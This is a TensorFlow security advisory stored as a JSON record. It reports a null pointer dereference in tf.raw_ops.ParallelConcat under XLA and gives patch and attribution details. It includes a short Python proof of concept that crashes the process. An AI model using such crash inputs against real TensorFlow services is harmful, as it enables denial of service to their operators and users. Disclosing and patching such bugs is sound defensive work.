{"description": "### Impact\nWhen running with XLA, `tf.raw_ops.ParallelConcat` segfaults with a nullptr dereference when given a parameter `shape` with rank that is not greater than zero.\n\n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.ParallelConcat\npara = {'shape':  0, 'values': [1]}\n\n@tf.function(jit_compile=True)\ndef test():\n   y = func(**para)\n   return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [da66bc6d5ff466aee084f9e7397980a24890cd15](https://github.com/tensorflow/tensorflow/commit/da66bc6d5ff466aee084f9e7397980a24890cd15).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n", "methods": ["None"]}
